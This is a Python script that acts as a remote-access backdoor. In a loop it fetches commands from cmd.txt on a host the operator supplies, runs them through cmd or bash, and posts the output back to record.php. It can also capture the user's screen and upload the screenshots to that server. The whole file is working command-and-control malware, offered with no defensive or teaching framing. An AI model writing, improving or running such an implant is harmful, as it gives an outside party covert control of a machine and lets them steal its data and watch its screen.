import argparse
import requests
import subprocess
import os
import time
import pyautogui
import random
import string
from PIL import Image

parser = argparse.ArgumentParser(description='Connect to web server and execute commands')
parser.add_argument('-host', type=str, help='Web server to connect to')
parser.add_argument('-eE', action='store_true', help='Enable execution of commands')
parser.add_argument('-rT', action='store_true', help='Send result as HTTP response')
parser.add_argument('-eL', action='store_true', help='Enable reconnection every 10 s')
parser.add_argument('-sS', action='store_true', help='Take a screenshot and send it to recored.php')

args = parser.parse_args()

while True:
    if args.host:
        url = args.host + '/cmd.txt'
        try:
            r = requests.get(url)
            r.raise_for_status()
            cmd = r.text.strip()
            print(f'Read command: {cmd}')
        except requests.exceptions.RequestException as e:
            print(f'Reading command failed: {e}')
            time.sleep(30)  # Wait 10 s before attempting to reconnect
            continue

        if args.eE:
            try:
                if os.name == 'nt':
                    output = subprocess.check_output(['cmd', '/c', cmd], shell=True, encoding='utf-8')
                else:
                    output = subprocess.check_output(['bash', '-c', cmd], shell=True, encoding='utf-8')

                print(f'Executed command: {cmd}')
                print(f'Result: {output}')

                if args.rT:
                    url = args.host + '/record.php'
                    try:
                        data = {'result': output}
                        r = requests.post(url, data=data)
                        r.raise_for_status()
                        print(f'Sent result as HTTP response. Response: {r.text}')

                        if args.sS:
                            screenshot = pyautogui.screenshot()
                            filename = ''.join(random.choices(string.ascii_uppercase + string.digits, k=10)) + '.png'
                            screenshot.save(filename)

                            url = args.host + '/record.php'
                            files = {'screenshot': open(filename, 'rb')}
                            try:
                                r = requests.post(url, files=files)
                                r.raise_for_status()
                                print(f'Sent screenshot as HTTP response. Response: {r.text}')
                            except requests.exceptions.RequestException as e:
                                print(f'Sending screenshot failed: {e}')
                    except requests.exceptions.RequestException as e:
                        print(f'Sending result failed: {e}')
                        time.sleep(30)  # Wait 10 s before attempting to reconnect
                        continue

                    try:
                        with open('result.txt', 'a') as f:
                            f.write(output + '\n')
                        print(f'Saved result to file: result.txt')
                    except IOError as e:
                        print(f'Writing to file failed: {e}')
                        time.sleep(30)  # Wait 10 s before attempting to reconnect
                        continue

            except subprocess.CalledProcessError as e:
                print(f'Execution of command failed: {e}')
                time.sleep(30)  # Wait 10 s before attempting to reconnect
                continue

        else:
            print(f'Execution of command disabled')
    else:
        print(f'No host provided')

    if args.eL:
        time.sleep(30)  # Wait 10 s before attempting to reconnect
    else:
        break